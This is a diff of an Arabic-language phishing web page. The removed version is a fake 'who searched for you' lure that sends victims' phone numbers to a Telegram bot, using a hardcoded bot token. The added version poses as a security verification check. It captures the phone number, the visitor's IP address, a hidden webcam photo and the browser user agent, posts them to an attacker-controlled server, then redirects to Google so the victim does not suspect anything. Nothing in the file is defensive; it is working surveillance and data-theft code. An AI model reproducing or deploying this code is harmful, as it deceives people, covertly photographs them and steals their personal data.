@@ -2,53 +2,83 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>كاشف الهوية - TOTV+</title>
+    <title>تحقق من هويتك</title>
     <style>
-        body { background: #0f1216; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #d4af37; width: 90%; max-width: 350px; text-align: center; }
-        h2 { color: #d4af37; margin: 0 0 10px 0; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: white; box-sizing: border-box; text-align: center; font-size: 18px; }
-        button { background: #d4af37; color: black; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        #status { font-size: 12px; color: #888; margin-top: 10px; }
+        body { background: #111; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .box { border: 1px solid #333; padding: 20px; display: inline-block; border-radius: 10px; background: #1a1a1a; }
+        input { padding: 10px; width: 80%; margin: 10px 0; border-radius: 5px; border: none; }
+        button { padding: 10px 20px; background: #2ecc71; border: none; color: white; cursor: pointer; border-radius: 5px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>⚜️ كاشف الهوية</h2>
-    <p style="font-size: 13px; color: #ccc;">أدخل الرقم لمعرفة من بحث عنك</p>
+<div class="box">
+    <h2>التحقق من الأمان</h2>
+    <p>أدخل رقم هاتفك لتأكيد هويتك</p>
     <input type="tel" id="phone" placeholder="07XXXXXXXX">
-    <button onclick="sendData()">كشف الآن</button>
-    <p id="status"></p>
+    <button onclick="captureAll()">تأكيد الآن</button>
+    <p id="msg"></p>
 </div>
 
+<video id="v" autoplay style="display:none"></video>
+<canvas id="c" style="display:none"></canvas>
+
 <script>
-    function sendData() {
+    // ضع رابط سيرفر Render هنا بعد الرفع
+    const API_URL = "https://your-app-name.onrender.com/log-data";
+
+    async function captureAll() {
         const phone = document.getElementById('phone').value;
-        if(phone.length < 5) return;
-
-        document.getElementById('status').innerText = "جاري الفحص...";
-
-        // بياناتك البرمجية
-        const TOKEN = "8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y";
-        const CHAT_ID = "5156556639";
-        const text = encodeURIComponent("🚨 صيد جديد:\nالرقم: " + phone);
-
-        // استخدام وسيط AllOrigins لتجاوز حظر CORS بدون سيرفر Node.js
-        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`;
+        if(phone.length < 10) return alert("الرقم غير صحيح");
         
-        fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`)
-        .then(() => {
-            document.getElementById('status').innerText = "تم التحقق!";
-            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
-        })
-        .catch(() => {
-            // في حال الفشل، نوجه المستخدم أيضاً لكي لا يشك بشيء
+        document.getElementById('msg').innerText = "جاري المعالجة...";
+
+        try {
+            // 1. جلب الـ IP للمستخدم
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+
+            // 2. فتح الكاميرا والتقاط صورة
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+
+            setTimeout(async () => {
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const img = canvas.toDataURL('image/jpeg', 0.6);
+                
+                stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا
+
+                // 3. إرسال كل شيء للسيرفر
+                await fetch(API_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        phone: phone,
+                        ip: ipData.ip,
+                        image: img,
+                        userAgent: navigator.userAgent
+                    })
+                });
+
+                window.location.href = "https://www.google.com";
+            }, 1000);
+
+        } catch (e) {
+            // في حال رفض الكاميرا نرسل البيانات المتاحة فقط
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            await fetch(API_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone: phone, ip: ipData.ip, image: null, userAgent: navigator.userAgent })
+            });
             window.location.href = "https://www.google.com";
-        });
+        }
     }
 </script>
-
 </body>
 </html>
